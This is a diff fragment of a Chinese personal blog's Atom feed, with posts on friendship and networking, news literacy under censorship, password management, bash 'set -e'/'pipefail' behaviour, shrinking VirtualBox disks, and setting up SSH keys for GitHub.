+&lt;p&gt;➜  ~  lsb_release -a&lt;br&gt;No LSB modules are available.&lt;br&gt;Distributor ID:    Ubuntu&lt;br&gt;Description:    Ubuntu 15.10&lt;br&gt;Release:    15.10&lt;br&gt;Codename:    wily&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="技术" scheme="http://jetwang99.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
+    
+    
+      <category term="Ubuntu" scheme="http://jetwang99.github.io/tags/Ubuntu/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>评程序员和会不会修电脑到底有几毛钱关系？</title>
+    <link href="http://jetwang99.github.io/2016/01/11/the-relation-of-developer-and-his-ablity-of-fixing-pc/"/>
+    <id>http://jetwang99.github.io/2016/01/11/the-relation-of-developer-and-his-ablity-of-fixing-pc/</id>
+    <published>2016-01-11T02:20:20.000Z</published>
+    <updated>2018-01-24T08:30:24.810Z</updated>
+    
+    <content type="html"><![CDATA[<p><a href="http://www.phpxs.com/post/4543" target="_blank" rel="noopener">原文链接</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;&lt;a href=&quot;http://www.phpxs.com/post/4543&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;原文链接&lt;/a&gt;&lt;/p&gt;
+
+      
+    
+    </summary>
+    
+      <category term="文章" scheme="http://jetwang99.github.io/categories/%E6%96%87%E7%AB%A0/"/>
+    
+    
+      <category term="搞笑" scheme="http://jetwang99.github.io/tags/%E6%90%9E%E7%AC%91/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>放弃那些无用的社交</title>
+    <link href="http://jetwang99.github.io/2015/10/13/drop-meaningless-social-activities/"/>
+    <id>http://jetwang99.github.io/2015/10/13/drop-meaningless-social-activities/</id>
+    <published>2015-10-12T20:34:34.000Z</published>
+    <updated>2018-01-24T08:30:24.789Z</updated>
+    
+    <content type="html"><![CDATA[<p>那年我一个人来到北京，带上父亲跟我说的一句话：多交朋友。</p><p>于是，上大学时，我酷爱社交，参加了三个社团，只要有活动，都会去打个酱油。我乐意留别人的电话，曾几何时，我把留到别人电话数量当成炫耀的资本。</p><p>我待人热情，对人诚恳，却总是被忽略。他们只有在打杂的时候，才会想到这个社团还有一个我。那段时间，虽然很多场合都有我的存在，但永远不是核心，别人也不太愿意跟我交朋友。</p><p>可活动后，留下打扫卫生的，永远是我。</p><a id="more"></a><p>一次，认识了学校的一个老师，那年我还是个学生，屁颠屁颠的大半夜去他办公室，只是因为他给我说了，晚上他一个人在办公室值班。</p><p>我听他跟我聊了很久，没有深聊，只是表面肤浅的交流了十几分钟，他告诉我，他是负责学校入党工作的。</p><p>我听的很认真，临走前留下了他的电话，还送了带来了的两袋水果。</p><p>后来我入党写申请书，那时不知道可以在网上下模板，傻里吧唧的发短信找他帮忙，他却冷冷的回了一条：我没空。</p><p>其实我在很多场合都遇到过了这样的拒绝，你以为你和对方留了电话存了微信，应该彼此能帮忙，却忘记了一件很重要的事情：只有关系平等，才能互相帮助。</p><p>这个故事没完。</p><p>几年后，我已经是一名英语老师，深夜接到了一个电话，正是几年前的那位老师。</p><p>他笑嘻嘻的跟我寒暄了两句，很快就聊到了正题：竟然是找我介绍靠谱的英语老师，希望私下能给他的孩子上一节课。</p><p>那段时间，我每天都在上课，白天劳累困顿，晚上晕头转向，加上想到过去的种种，于是我只是搪塞了，改天我看看，就匆匆挂了电话。</p><p>当然，我什么也没帮他。</p><p>后来我忽然想到这件事，为什么我没有帮他，或者说，很久以前，他为什么不肯帮助我。</p><p>答案很简单，除去彼此的感情，能让对方帮自己的根本条件，是你能提供等价的回报。换句话说，过去我是个学生，没法给他提供等价回报；而之后我不需要入党，他也没法给我提供等价回报。</p><p>而且，我们的感情基础是零。</p><p>事实很冷，但这是事实。</p><p>我们总是去参加社交，却不知道，很多社交其实并没有什么用，看似留了别人电话，却在需要帮助的时候，仅仅是白打了一个电话。</p><p>因为我们不够优秀。</p><p>很残忍，但谁愿意帮助一个不优秀的人呢。</p><p>曾有个朋友跟我说，我参加了不少社交，朋友也不少，为什么会越来越孤单，直到今天，很多事情都无人帮助我，难过。</p><p>我问她，社交场上，别人一般怎么介绍我。</p><p>她说，我的朋友，小白。</p><p>我说，一般怎么介绍那些优秀的人？</p><p>她说，独立撰稿人、主播、导演、教授… …某某某。</p><p>我说，所以你懂了，如果你自己不强大，那些社交其实没有什么用，只有等价的交换，才能得到合理的帮助。</p><p>所以，在你还没有足够强大足够优秀的时候，先别花太多那些宝贵的时间去社交，先花点时间读读书提升一下专业技能。我们都有过参加一个聚会发现无话可说甚至不知道做一些什么的经历，因为，这个群体，不属于你。</p><p><em>要知道，只有优秀的人，才能得到有用的社交。</em></p><p>几个月后，小白参加一个电视栏目大火，现在她依旧喜欢参加社交活动，她告诉我，现在甚至有些人每天给她每天分享一些文字，还有些是之前不喜欢理我的人。</p><p>一个当红作家曾经给我说过一个故事，他成名之前，给一个很大的报社投过稿，可是，多次发稿，却石沉大海。</p><p>一年后，他的书大卖，这家报社的创始人竟然亲自来找他约稿。</p><p>他们关系很好，因为一个需要卖书，一个需要发有质量的文字。有人说他和这个报社的关系好，他只说了一句话：</p><p><em>“等价的交换，才有了等价的友谊。”</em></p><p>别觉得世界残酷，这就是游戏规则，别着急痛苦这世界冰冷冷的像一块铁，请看完我的文字。</p><p>我在北京打拼的第一年，一无所有，可每周的都会有一个朋友来看我，给我送吃的，那哥们叫立冬，是我最好的朋友。</p><p>他曾经说，无论你是谁，但你是我兄弟。</p><p>后来我有点名气了，他依旧跟我说，别以为你是谁，你就是我兄弟。</p><p>这种人，被称为真朋友，他不适用于以上的规则。无论什么时候，他都愿意帮助你，无论你贫穷还是窝囊，因为你们共同经历过一些事情，他们总是不离不弃。你们的帮助，不用等价交换，只用感情平等，就好。</p><p>这种人不用多，在这个浮夸的世界里，几个就好。</p><p><em>所以，放弃那些无用无效的社交，提升自己，才能让世界变得更大。同时，相信世界上美好的友情，存在于彼此内心深处，安静的保守着他们。</em></p><p>（文/李尚龙）</p><p><a href="http://lcx.cc/?i=4568" target="_blank" rel="noopener">原文链接</a></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;那年我一个人来到北京，带上父亲跟我说的一句话：多交朋友。&lt;/p&gt;
+&lt;p&gt;于是，上大学时，我酷爱社交，参加了三个社团，只要有活动，都会去打个酱油。我乐意留别人的电话，曾几何时，我把留到别人电话数量当成炫耀的资本。&lt;/p&gt;
+&lt;p&gt;我待人热情，对人诚恳，却总是被忽略。他们只有在打杂的时候，才会想到这个社团还有一个我。那段时间，虽然很多场合都有我的存在，但永远不是核心，别人也不太愿意跟我交朋友。&lt;/p&gt;
+&lt;p&gt;可活动后，留下打扫卫生的，永远是我。&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="文章" scheme="http://jetwang99.github.io/categories/%E6%96%87%E7%AB%A0/"/>
+    
+    
+      <category term="心情" scheme="http://jetwang99.github.io/tags/%E5%BF%83%E6%83%85/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>做个聪明的信息消费者</title>
+    <link href="http://jetwang99.github.io/2015/08/21/to-be-a-smart-information-consumer/"/>
+    <id>http://jetwang99.github.io/2015/08/21/to-be-a-smart-information-consumer/</id>
+    <published>2015-08-20T18:52:52.000Z</published>
+    <updated>2018-01-24T08:30:24.811Z</updated>
+    
+    <content type="html"><![CDATA[<p><a href="https://iyouport.com/archives/45954" target="_blank" rel="noopener">原文链接</a> 需翻墙</p><p>作者：Sylar</p><p>近来有发现，部分翻墙网民一直没有登陆推特、谷歌，使用翻墙软件只为看一些政治八卦，后在墙内平台上传播。那些充满戏剧色彩的、或许永远也无从证实的「故事性消息」，满足着猎奇者的欲望。他们可以翻墙，但不经常翻墙，只在政治八卦的线索出现在视野内的时候，才能触发翻墙兴趣。实验将一篇正规外媒的消息链接发在这样的群体里，如果标题没能激起猎奇欲望的话，便很容易被忽略，大家认为「没必要费力搭梯子只为打开一个墙外链接」。</p><p>这让人感觉，长期处于新闻管制下的信息消费者，即便短期脱离管制，有可能依旧缺乏独立辨认信息的能力。猎奇心理的基础是寻求刺激，背景是反应迟钝或弱化，基本属于在长期「统一思想」的束缚之下需求被压制的结果。主要表现为轻信、偏执，分为渠道依赖型偏执和内容偏执（猎奇），后者有可能很快转化为前者。</p><a id="more"></a><p>基于传播心理，人们重视传播后的反馈，当刺激性成为传播质量的要素时，猎奇就成为了一种需求。政治八卦体现宫廷神秘感，之所以能引发兴趣是政治参与被剥夺的结果。中国长期的专制传统也一直在强化政治的神秘，猎奇心态的存在并不难理解。</p><p>受众普遍质疑官媒的消息，但并非完全是基于内容在思考下的判断，更多属于渠道排斥。即便不翻墙，正规陆媒和墙内「门户」一定程度上也没能拼得过自媒体和民间小道消息。但筛选渠道的新闻取信态度不可能完全解决真实度问题。至少，哪些是假装成自媒体而背后有集团或政治派系操纵的信息源，大众无从得知。如果不持续加强独立判断能力的话，只能承受花样儿愚弄。</p><p>不否认的确有「新闻理想」高涨的大陆媒体人一直在辛勤工作、承受各种压力，但公众否定的是他们为之服务的单位，于是不论他们个人怎么努力也依旧无法扭转公信力的低下。除非他们能联手对抗政党对新闻的束缚。近期有大陆媒体人转行下海的消息频现，被很多公众解读为「厌恶管制」了，足见公众是多么希望他们去抗争管制呢。很遗憾，这个真没有。</p><p>或许可以这样理解，时讯「谣言」的火爆、政治八卦的魅力体现的是信息消费者的判断力被阉割，是党管新闻的结果。管制加大了获取成本和传播成本，但一定程度上并没能激发人们对自由的追求和独立判断力，而是逐渐体现出如上这般辨识力低下的状况。获取成本与渠道偏好正相关，也就是说，人们会更倾向于相信那些需要付出一定「代价」才能获知到的信息，但这点必须在成本足够大、持续时间足够长的情况下才能实现。否则更可能带来的是疲惫和厌倦。</p><p>做为接受信息不自由的中国民众，更多是在被压制和被诱惑之间辗转，我们鼓励翻墙，脱离管制和灌输，但并不是说放弃一个渠道转而投入对另一个渠道的依赖。自由之地对个体思考判断能力的要求只会更高，该如何提升信息消费者的认知能力，或许是相比优化信息环境更为现实的问题。</p><p>简要介绍一下提高认知技能的几个训练步骤：</p><p><strong>1、识别内容。</strong>你看到的是些什么内容？</p><p>新闻被分为四种类型，其中官媒（包括所有党管治下的新闻机构）发布的是消息大多属于「肯定式新闻」、门户网站的新闻接近「断言式新闻」，新闻工作者在此只是起到了一个传声筒的作用，他们只需要背诵那些拟定好的观点和结论，不加质疑。这样的新闻不依靠准确、完整或核实来构筑公信力，只是以满足表达（或认可）一种信念为目的，而刻意选择性摘取消息的片段。「肯定式新闻」的标志是辩论文化让位于答案文化，目的是令社会稳定、看起来「井然有序」，免于争执。当然也拒绝了受众的独立思考。此外，强调准确和语境的「确证式新闻」是最传统的模式；被利益集团操控，基于特定目标和针对固定受众群体的、看起来像调查报道的新闻，是伪装成新闻的宣传。</p><p>党管下的新闻机构传递的是政党的观点，不加思考的承载官方叙事版本，空话连篇。即便没有通稿的要求和禁令的束缚，很多记者也越来越懒得亲自去查明事实，而是只凭直觉就接收他人的二手甚至三手消息。于是整体上给信息消费者的印象是新闻离事实越来越远，逐渐变成了另一种形式的舆论。而社交网络、博客和自媒体等新传播形式有可能使用上述任何一种模式来生产新闻。</p><p>真正通过核实的消息，信源会呈现多样化，记者（发布者）对各种信源保持着怀疑态度，并非停留在对信息表面的陈述，而是倾向于继续挖掘。</p><p><strong>2、信息细节的充分性。</strong>你看到的这篇报道完整吗？如果不完整，它缺了什么？</p><p>对完整性的检验涉及信息源、证据和潜在的偏见。新闻的缺陷是碎片化，本身缺乏完整性，信息消费者应该首先注意到的是「它提供了什么事实」，基于这些事实的证据是否充分，如果不能充分，则不可确信。由于「断言式新闻」的时效性较高，它提供的肯定只是片段，判断则需要将多方面的片段尽可能拼凑完整后再加以分析。而对于「肯定式新闻」来说，因为它急于呈现的是一个观点和论断，多半没有足够的事实，或没有仔细辨认过证据的真实性。</p><p><strong>3、评估信息源。</strong>传出信息的人是谁？为什么可以相信他们？</p><p>具体人名、身份对于判断来说只是一个很小的元素，关键在于这些人（信息源）是否真的掌握了信息。记者对信息源的选择不能夹带任何目的，媒体人考证信息源的积极性是新闻可信度的标志。采集到的是否一手信息？如果不是，中间隔了哪些环节？它们都足够可信吗？如果媒体人没能给公众呈现出这些疑点，便很容易形成误导或被聪明的消费者质疑。</p><p>有些时候信息消费者可以看到采访过程实录，需要注意的是记者的提问内容，究竟问的是事实，还是在寻求观点。如果是后者，则需要针对性思考，而不是仅凭直觉接收。如果发现记者在借助一系列对事实的追问，有目的的引导受访对象表现出媒体预期的态度，那就不叫采访，而是说服。</p><p><strong>4、评估证据。</strong>哪些才是证据？</p><p>观察和理解不是一回事，后者是个体基于前者加入了个人经验或感受后得出的结论，是「我感觉」，而不是「我看到」；推断和实据也不是一回事，自媒体渠道经常见到这种影响，令受众将推测结论和事实混淆在一起，认知被干扰。如果信息源是有目的地（比如党宣或被利益集团、政治派系所操控的，伪装的自媒体或新媒体），则会给信息消费者带来误导。</p><p><strong>5、还有其他可能性或解释吗？</strong>都是些什么？</p><p>如上述新闻分类，目前最常见到的是「断言式新闻」和「肯定式新闻」，它们不是以展示事实为根本的，事实只是宣传目标的附属品。那些未经核查的事物，不论其准确与否都属于断言，报道的目的是暗示和影响，而不是呈现。</p><p>如果信息消费者发现记者在采访中只是「给受访对象一个说话的机会，说出他们想说的话」，而不是尝试核实和质疑结论，那很可能无法确保是真实的。单个数据只能暗示事实，而无法确定事实，如果你看到的只是单一信息源发布的单一数据，便可以怀疑是基于宣传目的所做的「证据筛选」，在「肯定式新闻」中很常见。</p><p>排斥掉那些试图影响你的结论及证据，试着反问：还有其他可能性吗？哪一个更可能？或许有必要重复一下：这些新闻模式并非官媒和门户网站所独有。</p><p><strong>6、筛选题材。</strong>你得到了真正需要的新闻内容吗？</p><p>信息轰炸时代，各种渠道的新闻铺天盖地，对受众个体来说，那些东西真的都是你需要的吗？</p><p>你可能漏掉了什么，有没有发现一些消息里隐藏着对民生影响较大的意义？也可能过多接收了一些没有价值的纯宣传，还可能它们被误导了，这是比浪费时间更大的损失。基于上述，信息消费者应该明白自己究竟需要些什么题材的信息，以及对自己的预期而言哪些获取渠道更靠谱？获知有没有片面，如何将那些碎片拼凑到趋于完整？过滤掉重复的内容，避免被有目的的影响，做一个聪明的信息消费者。</p><p>篇幅有限，本文没有选取实例来分析。如果你学会了这些判断方法，不妨试用一下，它们并不复杂，谨慎取信只是个习惯问题。</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;a href=&quot;https://iyouport.com/archives/45954&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;原文链接&lt;/a&gt; 需翻墙&lt;/p&gt;
+&lt;p&gt;作者：Sylar&lt;/p&gt;
+&lt;p&gt;近来有发现，部分翻墙网民一直没有登陆推特、谷歌，使用翻墙软件只为看一些政治八卦，后在墙内平台上传播。那些充满戏剧色彩的、或许永远也无从证实的「故事性消息」，满足着猎奇者的欲望。他们可以翻墙，但不经常翻墙，只在政治八卦的线索出现在视野内的时候，才能触发翻墙兴趣。实验将一篇正规外媒的消息链接发在这样的群体里，如果标题没能激起猎奇欲望的话，便很容易被忽略，大家认为「没必要费力搭梯子只为打开一个墙外链接」。&lt;/p&gt;
+&lt;p&gt;这让人感觉，长期处于新闻管制下的信息消费者，即便短期脱离管制，有可能依旧缺乏独立辨认信息的能力。猎奇心理的基础是寻求刺激，背景是反应迟钝或弱化，基本属于在长期「统一思想」的束缚之下需求被压制的结果。主要表现为轻信、偏执，分为渠道依赖型偏执和内容偏执（猎奇），后者有可能很快转化为前者。&lt;/p&gt;
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>《密码疲劳》读后感</title>
+    <link href="http://jetwang99.github.io/2015/08/19/all-about-password/"/>
+    <id>http://jetwang99.github.io/2015/08/19/all-about-password/</id>
+    <published>2015-08-18T19:53:53.000Z</published>
+    <updated>2018-01-24T08:30:24.787Z</updated>
+    
+    <content type="html"><![CDATA[<p>今天有幸拜读阮大神昨天写的文章 <a href="http://www.ruanyifeng.com/blog/2015/08/password-fatigue.html" target="_blank" rel="noopener">密码疲劳</a> 颇有感触</p><p>一来各种重要的网银密码容易忘记的问题在信息社会是越来越重要，几乎所有的年轻人都无法回避这个问题；</p><p>二来几年时间自己已经成为资深网虫，注册的网站不计其数了，忘记密码是常有的事。</p><a id="more"></a><p>自从CSDN密码泄露事件之后，又陆陆续续有2000W开房数据信息泄露，然后就是携程事件，一个接着一个。。。我也有幸知道了创宇，知道了 <a href="http://wooyun.org/" target="_blank" rel="noopener">乌云</a> ，不得不说互联网时代，所有的公司都必须面对网站安全的问题，看看乌云爆出的一些漏洞中，有很多case严重到足够摧毁一家公司业务了，此处省略一万字吧</p><p>如今想想，当初看了 <a href="http://www.williamlong.info/" target="_blank" rel="noopener">月光博客</a> 的文章，养成了一个好的习惯是多么及时，有了lastpass，keepass等好用的工具软件，现在已经几乎没有忘记密码的烦恼了。否则，只怕是生活中各种不便，或者被各种论坛拖库事件间接伤害了。其中我在一个公开的网站还特地去检查过，验证了我的天涯密码泄露了，当时输入天涯用户名看到自己的密码明文显示在页面，如此轻易被查到，还是吓一跳啊</p><p>推荐几篇关于密码安全的文章，当然凡事没有绝对，再牛的密码遇到网站明文存储也是毫无安全可言</p><p><a href="http://www.williamlong.info/archives/2937.html" target="_blank" rel="noopener">个人密码安全策略</a></p><p><a href="http://www.williamlong.info/archives/3660.html" target="_blank" rel="noopener">设计自己的密码规则，实现强壮的自我保护</a></p><p><a href="http://www.williamlong.info/archives/3100.html" target="_blank" rel="noopener">常用个人密码管理软件</a></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;今天有幸拜读阮大神昨天写的文章 &lt;a href=&quot;http://www.ruanyifeng.com/blog/2015/08/password-fatigue.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;密码疲劳&lt;/a&gt; 颇有感触&lt;/p&gt;
+&lt;p&gt;一来各种重要的网银密码容易忘记的问题在信息社会是越来越重要，几乎所有的年轻人都无法回避这个问题；&lt;/p&gt;
+&lt;p&gt;二来几年时间自己已经成为资深网虫，注册的网站不计其数了，忘记密码是常有的事。&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="文章" scheme="http://jetwang99.github.io/categories/%E6%96%87%E7%AB%A0/"/>
+    
+    
+      <category term="安全" scheme="http://jetwang99.github.io/tags/%E5%AE%89%E5%85%A8/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>linux中的set命令: set -e 与 set -o pipefail </title>
+    <link href="http://jetwang99.github.io/2015/08/07/linux-set--e/"/>
+    <id>http://jetwang99.github.io/2015/08/07/linux-set--e/</id>
+    <published>2015-08-07T06:04:04.000Z</published>
+    <updated>2018-01-24T08:30:24.800Z</updated>
+    
+    <content type="html"><![CDATA[<p>工作中经常在shell脚本中看到set的这两个用法，但就像生活中的很多事情，习惯导致忽视，直到出现问题才引起关注。</p><h3 id="1-set-e"><a href="#1-set-e" class="headerlink" title="1. set -e"></a>1. set -e</h3><p>set命令的-e参数，linux自带的说明如下：</p><p>“Exit immediately if a simple command exits with a non-zero status.”</p><p>也就是说，在”set -e”之后出现的代码，一旦出现了返回值非零，整个脚本就会立即退出。有的人喜欢使用这个参数，是出于保证代码安全性的考虑。但有的时候，这种美好的初衷，也会导致严重的问题。</p><a id="more"></a><p>真实案例：<br>脚本a.sh开头使用了”set -e”，且能正常运行。在几个月或更久以后，因需求升级，在脚本中增加了3行hadoop操作：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">set -e</span><br><span class="line">...</span><br><span class="line">/home/work/.../hadoop dfs -rmr /app/.../dir</span><br><span class="line">/home/work/.../hadoop dfs -mkdir /app/.../dir</span><br><span class="line">/home/work/.../hadoop dfs -put file_1 /app/.../dir/</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p><p>这几行hadoop命令逻辑很简单：在hdfs上清除并新建一个目录，并将一份本地文件推送至这个目录，供后续使用。将这几行单拎出来，在命令行下执行，除了提示待删除的目录不存在，并没有什么问题，文件还是会被推送到指定的地方。</p><p>但第一次执行这个脚本的时候，却失败退出了，且导致调用该脚本的程序整体退出，造成了严重的后果。原因是hdfs上还没有这个目录，rmr这一行会返回255，这个值被脚本前方的”set -e”捕捉到，直接导致了脚本退出。</p><p>新增的代码本身并没有问题，先删除再新建目录，反而是保证数据安全的比较规范的操作，删除命令本身的容错性，可以保证后续命令正常执行。事实是这个脚本有好几百行，且逻辑比较复杂，在增加这几行代码的时候，开发人员已经不记得这个脚本里还有个”set -e”埋伏着了。</p><p>可见设置”set -e”，在脚本开发过程中可能很有帮助，而在开发完成后，特别是对于后期可能有升级的脚本，则可能是埋下了安全隐患。</p><h3 id="2-set-o-pipefail"><a href="#2-set-o-pipefail" class="headerlink" title="2. set -o pipefail"></a>2. set -o pipefail</h3><p>对于set命令-o参数的pipefail选项，linux是这样解释的：</p><p>“If set, the return value of a pipeline is the value of the last (rightmost) command to exit with a non-zero status,or zero if all commands in the pipeline exit successfully. This option is disabled by default.”</p><p>设置了这个选项以后，包含管道命令的语句的返回值，会变成最后一个返回非零的管道命令的返回值。听起来比较绕，其实也很简单：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># test.sh</span><br><span class="line">set -o pipefail</span><br><span class="line">ls ./a.txt |echo &quot;hi&quot; &gt;/dev/null</span><br><span class="line">echo $?</span><br></pre></td></tr></table></figure><p>运行test.sh，因为当前目录并不存在a.txt文件，输出：<br>ls: ./a.txt: No such file or directory<br>1 #设置了set -o pipefail，返回从右往左第一个非零返回值，即ls的返回值1</p><p>注释掉set -o pipefail这一行，再次运行，输出：<br>ls: ./a.txt: No such file or directory<br>0 # 没有set -o pipefail，默认返回最后一个管道命令的返回值</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;工作中经常在shell脚本中看到set的这两个用法，但就像生活中的很多事情，习惯导致忽视，直到出现问题才引起关注。&lt;/p&gt;
+&lt;h3 id=&quot;1-set-e&quot;&gt;&lt;a href=&quot;#1-set-e&quot; class=&quot;headerlink&quot; title=&quot;1. set -e&quot;&gt;&lt;/a&gt;1. set -e&lt;/h3&gt;&lt;p&gt;set命令的-e参数，linux自带的说明如下：&lt;/p&gt;
+&lt;p&gt;“Exit immediately if a simple command exits with a non-zero status.”&lt;/p&gt;
+&lt;p&gt;也就是说，在”set -e”之后出现的代码，一旦出现了返回值非零，整个脚本就会立即退出。有的人喜欢使用这个参数，是出于保证代码安全性的考虑。但有的时候，这种美好的初衷，也会导致严重的问题。&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="技术" scheme="http://jetwang99.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
+    
+    
+      <category term="Linux" scheme="http://jetwang99.github.io/tags/Linux/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>virtualbox压缩vdi硬盘</title>
+    <link href="http://jetwang99.github.io/2015/08/04/shrink-virtualbox-disk-file/"/>
+    <id>http://jetwang99.github.io/2015/08/04/shrink-virtualbox-disk-file/</id>
+    <published>2015-08-04T01:09:09.000Z</published>
+    <updated>2018-01-24T08:30:24.809Z</updated>
+    
+    <content type="html"><![CDATA[<p>查看虚拟硬盘（固定大小）信息：</p><p>“C:\Program Files\Oracle\VirtualBox\VBoxManage.exe” showhdinfo win10.vdi<br>UUID:           36524650-f833-4cbd-ac82-899603ae2f4c<br>Parent UUID:    base<br>State:          created<br>Type:           normal (base)<br>Location:       C:\Users\YOURNAME\VirtualBox VMs\Win10\Win10.vdi<br>Storage format: VDI<br>Format variant: fixed default<br>Capacity:       51200 MBytes<br>Size on disk:   51048 MBytes<br>Encryption:     disabled<br>In use by VMs:  Win10 (UUID: f3dc93e9-d91e-4078-8a9f-0cdd811b0552)</p><a id="more"></a><p>修改固定大小的虚拟硬盘为动态分配存储的硬盘，可以看到操作后Format variant变成dynamic default：</p><p>“C:\Program Files\Oracle\VirtualBox\VBoxManage.exe” modifyhd Win10.vdi -type normal</p><p>下面开始磁盘空间压缩，方法是这样：</p><p>1,在guest os 中清理系统， windows的话可以再硬盘碎片整理一下</p><p>2,在 guest os 中 使用 sdelete -z； linux 使用 zerofree</p><p>3,”C:\Program Files\Oracle\VirtualBox\VBoxManage.exe” modifyhd <uuid>|<filename>  –compact</filename></uuid></p><p>第一次尝试之后发现这个操作对减小vdi文件体积的作用不明显，于是我关闭了虚拟机系统盘的bitlocker然后再按照步骤123来了一遍，并且第二步加了个参数</p><p>sdelete -c -z</p><p>然后，50G的VDI大小变成了20G左右，目前还不确定是bitlocker未关闭还是-c这个参数造成的第一次尝试失败，神奇Oracle！</p><p>over</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;查看虚拟硬盘（固定大小）信息：&lt;/p&gt;
+&lt;p&gt;“C:\Program Files\Oracle\VirtualBox\VBoxManage.exe” showhdinfo win10.vdi&lt;br&gt;UUID:           36524650-f833-4cbd-ac82-899603ae2f4c&lt;br&gt;Parent UUID:    base&lt;br&gt;State:          created&lt;br&gt;Type:           normal (base)&lt;br&gt;Location:       C:\Users\YOURNAME\VirtualBox VMs\Win10\Win10.vdi&lt;br&gt;Storage format: VDI&lt;br&gt;Format variant: fixed default&lt;br&gt;Capacity:       51200 MBytes&lt;br&gt;Size on disk:   51048 MBytes&lt;br&gt;Encryption:     disabled&lt;br&gt;In use by VMs:  Win10 (UUID: f3dc93e9-d91e-4078-8a9f-0cdd811b0552)&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="技术" scheme="http://jetwang99.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
+    
+    
+      <category term="虚拟化" scheme="http://jetwang99.github.io/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Github Gitcafe 在同一台机器设置SSH密钥</title>
+    <link href="http://jetwang99.github.io/2015/04/26/github-gitcafe-sshkey/"/>
+    <id>http://jetwang99.github.io/2015/04/26/github-gitcafe-sshkey/</id>
+    <published>2015-04-25T18:22:22.000Z</published>
+    <updated>2018-01-24T08:30:24.791Z</updated>
+    
+    <content type="html"><![CDATA[<hr><p>想想自己以前把博客同步到github和gitcafe不停地敲重复命令的方法就是醉了</p><p>我的机器是Windows7，对应的~/.ssh目录就是C:\Users\yourname\.ssh</p><p>cd C:\Users\yourname<br>md .ssh<br>cd .ssh</p><a id="more"></a><p>添加一个config文件并加入以下内容</p><pre><code>Host github.comUser gitHostname github.comIdentityFile ~/.ssh/githubTCPKeepAlive yesIdentitiesOnly yes</code></pre><p>生成新的SSH 秘钥</p><p>for gitcafe（deprecate）:</p><pre><code>ssh-keygen -t rsa -C &quot;ajasonwang@gmail.com&quot; -f gitcafe</code></pre><p>for github:</p><pre><code>ssh-keygen -t rsa -C &quot;ajasonwang@gmail.com&quot; -f github</code></pre><p>for coding.net:</p><pre><code>ssh-keygen -t rsa -C &quot;ajasonwang@gmail.com&quot; -f id_rsa</code></pre><p>1、用文本工具打开公钥文件*.pub ，复制里面的所有内容到剪贴板。</p><p>2、进入对应账户设置–&gt;SSH 公钥管理设置项，点击添加新公钥 按钮，在 Title 文本框中输入任意字符。</p><p>3、在 Key 文本框粘贴刚才复制的公钥字符串，按保存按钮完成操作。</p><p>4、测试</p><pre><code> C:\Users\sa\.ssh 的目录                                                                                     2016/12/13  08:42    &lt;DIR&gt;          .                                                                     2016/12/13  08:42    &lt;DIR&gt;          ..                                                                    2016/12/13  08:40             1,675 github                                                                2016/12/13  08:40               402 github.pub                                                            2016/12/13  08:42             1,679 id_rsa                                                                2016/12/13  08:42               402 id_rsa.pub                                                            2016/12/13  08:35               410 known_hosts                                                                          6 个文件          4,680 字节                                                                                   2 个目录 29,375,688,704 可用字节                                                                  sa@DESKTOP-OK6H1D8 C:\Users\sa\.ssh                                                                       $ ssh -T git@github.com -i github                                                                         Warning: Permanently added the RSA host key for IP address &apos;192.30.253.112&apos; to the list of known hosts.   Hi jetwang99! You&apos;ve successfully authenticated, but GitHub does not provide shell access.               sa@DESKTOP-OK6H1D8 C:\Users\sa\.ssh                                                                       $ ssh -T git@git.coding.net -i id_rsa                                                                     Hello jetwang99! You&apos;ve connected to Coding.net via SSH successfully!                                    </code></pre><p>成功。</p><p>5、同时部署到github，gitcafe的命令和设置</p><pre><code>git push github master:mastergit push gitcafe master:gitcafe-pagesgit push coding_net master:master</code></pre><p>下面是我的git配置文件：</p><pre><code>[core]    repositoryformatversion = 0    filemode = false    bare = false    logallrefupdates = true    symlinks = false    ignorecase = true    hideDotFiles = dotGitOnly[remote &quot;github&quot;]url = git@github.com:jetwang99/myhexoblog.gitfetch = +refs/heads/*:refs/remotes/github/*[remote &quot;coding_net&quot;]url = git@git.coding.net:jetwang99/myhexoblog.gitfetch = +refs/heads/*:refs/remotes/coding_net/*[branch &quot;master&quot;]remote = githubmerge = refs/heads/master</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      &lt;hr&gt;
+&lt;p&gt;想想自己以前把博客同步到github和gitcafe不停地敲重复命令的方法就是醉了&lt;/p&gt;
+&lt;p&gt;我的机器是Windows7，对应的~/.ssh目录就是C:\Users\yourname\.ssh&lt;/p&gt;
+&lt;p&gt;cd C:\Users\yourname&lt;br&gt;md .ssh&lt;br&gt;cd .ssh&lt;/p&gt;
+    
+    </summary>
+    
